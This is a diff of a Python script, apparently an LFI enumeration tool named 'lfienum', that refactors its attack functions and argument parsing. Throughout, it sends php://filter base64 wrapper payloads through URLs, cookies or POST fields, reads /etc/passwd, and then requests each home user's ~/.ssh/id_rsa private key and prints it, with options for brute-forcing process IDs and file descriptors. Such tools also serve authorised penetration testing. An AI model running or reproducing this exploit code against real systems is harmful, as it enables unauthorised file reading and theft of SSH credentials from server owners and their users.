+  if data_mode == True:
+    response = request(url, data={data:'php://filter/convert.base64-encode/resource=' + wrapper}, verify=True, headers=headers, allow_redirects=False)	
+  if cookie_mode is None and data_mode is None:
+    response = request(url + 'php://filter/convert.base64-encode/resource=' + wrapper, verify=True, headers=headers, allow_redirects=False)	
+  content = XCF(response)	
+  if len(content) > 0 and content != blacklist:		
+    if cookie_mode == True:		
+      print(ColGreenMark + "> " + url + ' ' + cookie + '=php://filter/convert.base64-encode/resource=' + wrapper + ColEnd)			
+    if data_mode == True:		
+      print(ColGreenMark + "> " + url + ' ' + data + '=php://filter/convert.base64-encode/resource=' + wrapper + ColEnd)	
+    if cookie_mode is None and data_mode is None:		
+      print(ColGreenMark + "> " + url + 'php://filter/convert.base64-encode/resource=' + wrapper + ColEnd)		
+    if package_status == True:		
+      print ('[Response Code]:', response.status_code)
+      print ('[Encoded Content Lenght]:', len(content), '\n')
+    if only_url == False:
+      print (content.strip("\n"))			
+      try:
+        print("\n" + base64.b64decode(content).decode('utf-8'))	
+      except UnicodeDecodeError:	
+        print ('\n\n' + ColRedMark + 'Something went wrong while decoding base64. Junk data? Try decoding manually or use other XCF function' + ColEnd + '\n')
+        exit(1)
+        
+  return response
 	
 def IdRSA():
 
-	global resp
-	
-	if cookie_mode == True:
-	
-		resp = request(url, cookies={cookie:'/etc/passwd'}, headers=headers)
-		
-	if data_mode == True:
-	
-		resp = request(url, data={data:'/etc/passwd'}, headers=headers)
-	
-	else:
-	
-		
-		resp = request(url + '/etc/passwd', headers=headers)
-	
-	clean_response = resp.text
+  if cookie_mode == True:	
+    response = request(url, cookies={cookie:'/etc/passwd'}, headers=headers)		
+  if data_mode == True:	
+    response = request(url, data={data:'/etc/passwd'}, headers=headers)	
+  if cookie_mode is None and data_mode is None:			
+    response = request(url + '/etc/passwd', headers=headers)	
+  for fetch_users in response.text.split('\n'):
+    if ':/home/' in fetch_users:		
+      if cookie_mode == True:			
+        fetch_id_rsa = request(url, cookies={cookie:'/home/' + fetch_users.split(":")[0].strip() + '/.ssh/id_rsa'}, verify=True, headers=headers, allow_redirects=False)				
+      if data_mode == True:			
+        fetch_id_rsa = request(url, data={data:'/home/' + fetch_users.split(":")[0].strip() + '/.ssh/id_rsa'}, verify=True, headers=headers, allow_redirects=False)			
+      if cookie_mode is None and data_mode is None:			
+        fetch_id_rsa = request(url + '/home/' + fetch_users.split(":")[0].strip() + '/.ssh/id_rsa', verify=True, headers=headers, allow_redirects=False)
+      response = fetch_id_rsa
+      if fetch_id_rsa.status_code == 200 or fetch_id_rsa.status_code == 301 or fetch_id_rsa.status_code == 302:
+        content = XCF(response)
+        if len(content) > 0 and content != blacklist:
+          if cookie_mode == True:					
+            print (ColGreenMark + '> ' + url + ' ' + cookie + '=/home/' + fetch_users.split(":")[0].strip() + '/.ssh/id_rsa' + ColEnd)						
+          if data_mode == True:					
+            print (ColGreenMark + '> ' + url + ' ' + data + '=/home/' + fetch_users.split(":")[0].strip() + '/.ssh/id_rsa' + ColEnd)						
+          if cookie_mode is None and data_mode is None:					
+            print (ColGreenMark + '> ' + url + '/home/' + fetch_users.split(":")[0].strip() + '/.ssh/id_rsa' + ColEnd)					
+          if only_url == False:						
+            print (ColYellowMark + '> ' + fetch_users.split(":")[0].strip() + ' id_rsa private key' + ColEnd)					
+          if package_status == True:	
+            PackageStatus(response, content)
+          if only_url == False:					
+            print (content)
+            
+  return response
 
-	for fetch_users in clean_response.split('\n'):
-
-		if ':/home/' in fetch_users:
-		
-			if cookie_mode == True:
-			
-				fetch_id_rsa = request(url, cookies={cookie:'/home/' + fetch_users.split(":")[0].strip() + '/.ssh/id_rsa'}, verify=True, headers=headers, allow_redirects=False)
-				
-			if data_mode == True:
-			
-				fetch_id_rsa = request(url, data={data:'/home/' + fetch_users.split(":")[0].strip() + '/.ssh/id_rsa'}, verify=True, headers=headers, allow_redirects=False)
-			
-			else:
-			
-				fetch_id_rsa = request(url + '/home/' + fetch_users.split(":")[0].strip() + '/.ssh/id_rsa', verify=True, headers=headers, allow_redirects=False)
-			resp = fetch_id_rsa
-
-			if fetch_id_rsa.status_code == 200 or fetch_id_rsa.status_code == 301 or fetch_id_rsa.status_code == 302:
-
-				XCF()
-
-				if len(clean_content) > 0:
-
-					if cookie_mode == True:
-					
-						print (ColGreenMark + '> ' + url + ' ' + cookie + '=/home/' + fetch_users.split(":")[0].strip() + '/.ssh/id_rsa' + ColEnd)
-						
-					if data_mode == True:
-					
-						print (ColGreenMark + '> ' + url + ' ' + data + '=/home/' + fetch_users.split(":")[0].strip() + '/.ssh/id_rsa' + ColEnd)
-						
-					else:
-					
-						print (ColGreenMark + '> ' + url + '/home/' + fetch_users.split(":")[0].strip() + '/.ssh/id_rsa' + ColEnd)
-					
-					if only_url == False:
-						
-						print (ColYellowMark + '> ' + fetch_users.split(":")[0].strip() + ' id_rsa private key' + ColEnd)
-					
-					if package_status == True:
-	
-						PackageStatus()
-
-					if only_url == False:
-					
-						print (clean_content)
+request = requests.get						
+cookie_mode = None
+data_mode = None
+wordlist = None
+pid = None
+pids = None
+wrapper = None
+key = None
+fd = None
+blacklist = None
 
 def Main():
-
-	if '-h' in sys.argv or '--help' in sys.argv:
-
-		Help()
-		sys.exit(1)
-		
-	if '-ah' in sys.argv or '--advanced-help' in sys.argv:
 	
-		Help()
-		AdHelp()
-		sys.exit(1)
-
-	parser = []
-	for arg in sys.argv:
-		parser.append(arg)
-
-		if '-X' == arg:	
-			
-			methodp = int(parser.index(arg)+1)
-
-		if '-w' == arg or '--wordlist' == arg:
-
-			wordlistp = int(parser.index(arg)+1)
-		
-		if '--fd' == arg:	
-			
-			fdp = int(parser.index(arg)+1)
-    		
-		if '--pids' == arg:	
-			
-			pidsp = int(parser.index(arg)+1)
-			
-		if '--pid' == arg:	
-			
-			pidp = int(parser.index(arg)+1)
-			
-		if '--wrapper' == arg:	
-			
-			wrapperp = int(parser.index(arg)+1)
-			
-		if '-k' == arg or '--key' == arg:	
-			
-			keyp = True
-			
-		if '--cookie-mode' == arg:
-
-			global cookie_mode
-			cookie_mode = True
-			cookiep = int(parser.index(arg)+1)
-		
-		if '--data-mode' == arg:
-
-			global data_mode
-			data_mode = True
-			datap = int(parser.index(arg)+1)
-
-	global request
-	global method
-	global wordlist
-	global fd_x
-	global pids_x
-	global pid_x
-	global wrap_x
-	global key_x
-	global cookie
-	global data
-
-	try:
-		method = parser[methodp]
+  arguments_list = []
+  for arg in sys.argv:
+    arguments_list.append(arg)
+  for argument in arguments_list:  
+    if argument == '-w' or argument == '--wordlist':
+      global wordlist
+      n = arguments_list.index(argument)+1
+      wordlist = arguments_list[n]
+    if argument == '-X':
+      global request
+      n = arguments_list.index(argument)+1
+      try:
+        method = arguments_list[n]
+        if method.casefold() == 'POST'.casefold():
+          request = requests.post
+        elif method.casefold() == 'GET'.casefold():
+          request = requests.get
+      except IndexError:
+        print ("method usage example:")
+        print ("python3 lfienum http://ghost.server/index.php -X POST --data-mode file")
+        exit(1)
+    if argument == '--pid':
+      global pid
+      n = arguments_list.index(argument)+1
+      try:
+        pid = int(arguments_list[n])
+      except (IndexError,ValueError):
+        print ("single pid usage:")
+        print ('python3 lfienum "http://ghost.server/index.php?page=" --pid 1')
+        exit(1)
+    if argument == '--pids':
+      global pids
+      n = arguments_list.index(argument)+1
+      try:
+        pids = int(arguments_list[n])
+      except IndexError:
+        pids = 999
+      except ValueError:
+        print ("bruteforce pids usage:")
+        print ('python3 lfienum "http://ghost.server/index.php?page=" --pids 500')
+        exit(1)		
+    if argument == '--wrapper':
+      global wrapper
+      n = arguments_list.index(argument)+1
+      try:
+        wrapper = arguments_list[n]	
+      except IndexError:
+        print ("wrapper argument usage example:")
+        print ("python3 lfienum http://ghost.server/index.php?page= --wrapper index.php")
+        exit(1)		
+    if argument == '-k' or argument == '--key':
+      global key
+      key = True
+    if argument == '--fd':
+      global fd
+      n = arguments_list.index(argument)+1
+      try:
+        fd = int(arguments_list[n])
+      except IndexError:
+        fd = 30
+      except ValueError:
+        print ("bruteforce fd usage:")
+        print ('python3 lfienum "http://ghost.server/index.php?page=" --fd 9')
+        exit(1)		
+    if argument == '--cookie-mode':
+      global cookie_mode
+      global cookie
+      cookie_mode = True
+      n = arguments_list.index(argument)+1
+      try:
+        cookie = arguments_list[n]
+      except IndexError:
+        print ("cookie usage example:")
+        print ("python3 lfienum http://ghost.server/index.php --cookie-mode 'session'")
+        exit(1)		
+    if argument == '--data-mode':
+      global data_mode
+      global data
+      data_mode = True
+      n = arguments_list.index(argument)+1
+      try:
+        data = arguments_list[n]
+      except IndexError:
+        print ("data usage example:")
+        print ("python3 lfienum http://ghost.server/index.php -X POST --data-mode 'file'")
+        exit(1)				
+    if argument == '--exclude':
+      global blacklist
+      n = arguments_list.index(argument)+1
+      try:			
+        blacklist = arguments_list[n]
+      except IndexError:
+        print ("exclude usage example:")
+        print ("python3 lfienum http://ghost.server/index.php --exclude 'File not found.'")
+        exit(1)
+				
+  if '--data-mode' in sys.argv and not '-X' in sys.argv:
+    request = requests.post
+    				
+  if wordlist is not None:
+    Wordlist()
+  if pid is not None:
+    PID()
+  if pids is not None:
+    PIDS()
+  if wrapper is not None:
+    Wrapper()
+  if key is not None:
+    IdRSA()
+  if fd is not None:
+    FD(fd)
 	
-		if method.casefold() == 'POST'.casefold():
+  if 'http' in sys.argv[1] and not '--pids' in sys.argv and not '--pid' in sys.argv and not '--fd' in sys.argv and not '--wrapper' in sys.argv and not '-w' in sys.argv and not '--wordlist' in sys.argv and not '-k' in sys.argv and not '--key' in sys.argv:
 
-			request = requests.post
-		
-		elif method.casefold() == 'GET'.casefold():
-
-			request = requests.get
-		else:
-		
-			request = requests.get
-
-	except NameError:
-		
-		if '--data-mode' in sys.argv and not '-X' in sys.argv:
-
-			request = requests.post
-
-		else:
-			request = requests.get
-		
-	except IndexError:
-	
-		print ("method usage example:")
-		print ("python3 lfienum http://ghost.server/index.php -X POST --data-mode file")
-		sys.exit(1)
-		
-	except UnboundLocalError:
-		pass
-
-	try:
-		data = parser[datap]
-		
-	except IndexError:
-	
-		print ("data usage example:")
-		print ("python3 lfienum http://ghost.server/index.php -X POST --data-mode 'file'")
-		sys.exit(1)
-		
-	except UnboundLocalError:
-	
-		data_mode = False
-		pass
-
-	try:
-		cookie = parser[cookiep]
-		
-	except IndexError:
-	
-		print ("cookie usage example:")
-		print ("python3 lfienum http://ghost.server/index.php --cookie-mode 'session'")
-		sys.exit(1)
-		
-	except UnboundLocalError:
-	
-		cookie_mode = False
-		pass
-	
-	try:
-		if 'http' in sys.argv[1] and not '--pids' in sys.argv and not '--pid' in sys.argv and not '--fd' in sys.argv and not '--wrapper' in sys.argv and not '-w' in sys.argv and not '--wordlist' in sys.argv and not '-k' in sys.argv and not '--key' in sys.argv:
-		
-			LinEnum()
-			IdRSA()
-			WinEnum()
-
-	except:
-	
-		sys.exit(1)
-
-
-	try:
-		if keyp == True:
-	
-			key_x = parser[keyp]
-			IdRSA()
-	
-	except UnboundLocalError:
-		pass
-
-	try:
-		wrap_x = parser[wrapperp]
-		Wrapper()
-	
-	except IndexError:
-
-		print ("wrapper argument usage example:")
-		print ("python3 lfienum http://ghost.server/index.php?page= --wrapper index.php")
-		sys.exit(1)
-		
-	except UnboundLocalError:
-		pass
-	
-	try:
-		pid_x = parser[pidp]
-		PID()
-	
-	except (IndexError,ValueError):
-	
-		print ("single pid usage:")
-		print ('python3 lfienum "http://ghost.server/index.php?page=" --pid 1')
-		sys.exit(1)
-		
-	except UnboundLocalError:
-		pass
-	
-	try:
-		pids_x = parser[pidsp]
-		PIDS()
-	
-	except IndexError:
-
-		pids_x = 999
-		PIDS()
-
-	except UnboundLocalError:
-		pass
-
-	try:
-		fd_x = parser[fdp]
-		FD()
-	
-	except IndexError:
-	
-		fd_x=30
-		FD()		
-
-	except UnboundLocalError:
-		pass
-
-	try:
-		wordlist = parser[wordlistp]
-		Wordlist()
-	
-	except FileNotFoundError:
-	
-		print("FileNotFoundError: [Errno 2] No such file or directory: " + "'" + wordlist + "'")
-		sys.exit(1)
-		
-	except IndexError:
-	
-		print ("wordlist usage example:")
-		print ("python3 lfienum http://ghost.server/index.php?page= --wordlist wordlist.txt")
-		sys.exit(1)
-	
-	except UnboundLocalError:
-		pass
+    prior_wordlist,later_wordlist = CheckCon()
+    Enum(prior_wordlist,later_wordlist)
+    IdRSA()
 
 CheckCon()
 Main()
